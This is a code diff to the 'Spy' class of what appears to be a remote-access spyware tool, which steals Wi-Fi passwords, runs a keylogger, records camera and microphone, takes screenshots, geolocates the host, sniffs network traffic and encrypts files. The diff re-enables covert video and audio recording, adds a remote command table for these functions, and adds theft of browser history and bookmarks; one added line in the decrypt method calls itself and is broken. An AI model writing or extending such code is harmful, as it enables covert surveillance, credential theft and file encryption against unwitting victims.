@@ -3,11 +3,12 @@ from typing import Optional, Tuple
 from spying.KeyLogger import KeyLogger
 from spying.Wifi import steal_passwords
 import spying.admin
-# from spying.video import VideoRecorder, AudioRecorder, get_available_cameras
+from spying.video import VideoRecorder, AudioRecorder, get_available_cameras
 from pyautogui import screenshot
 import geocoder
 from spying.encrypt import Encryptor
 from spying.snnifing import netstart, filestart, stop_sniffing
+from browser_history import get_history, get_bookmarks
 
 
 class Spy:
@@ -18,6 +19,17 @@ class Spy:
         self.video_recorder: Optional[VideoRecorder] = None
         self.audio_recorder: Optional[AudioRecorder] = None
         self.encryptor: Optional[Encryptor] = None
+        self.ok_commands = {
+            "steal_passwords": self.steal_passwords,
+            "start_keylogger": self.start_keylogger,
+            "stop_keylogger": self.stop_keylogger,
+            "start_video_audio_record": self.start_video_audio_record,
+            "start_video_recording": self.start_video_recording,
+            "start_audio_recording": self.start_audio_recording,
+            "stop_video_audio_record": self.stop_video_audio_record,
+            "stop_video_recording": self.stop_video_recording,
+            "stop_audio_recording": self.stop_audio_recording
+        }
 
     @staticmethod
     def steal_passwords() -> str:
@@ -110,11 +122,11 @@ class Spy:
         return geocoder.ip('me').json
 
     @property
-    def encryption_key(self):
+    def encryption_key(self) -> str:
         if self.encryptor:
-            return self.encryptor.encryption_key
+            return self.encryptor.encryption_key.decode()
         self.encryptor = Encryptor()
-        return self.encryptor.encryption_key
+        return self.encryptor.encryption_key.decode()
 
     def encrypt(self, path: str) -> Tuple[list, list]:
         return self.encryptor.encrypt(path)
@@ -123,6 +135,7 @@ class Spy:
         if not key:
             return self.encryptor.decrypt(path)
         e = Encryptor(key)
+        return self.decrypt(path)
 
     @staticmethod
     def start_sniffing_to_file(path: str) -> bool:
@@ -135,4 +148,9 @@ class Spy:
     @staticmethod
     def stop_sniffing():
         return stop_sniffing()
+
+    @staticmethod
+    def get_browser_info() -> Tuple[list, list]:
+        return get_history().histories, get_bookmarks().bookmarks
+
 
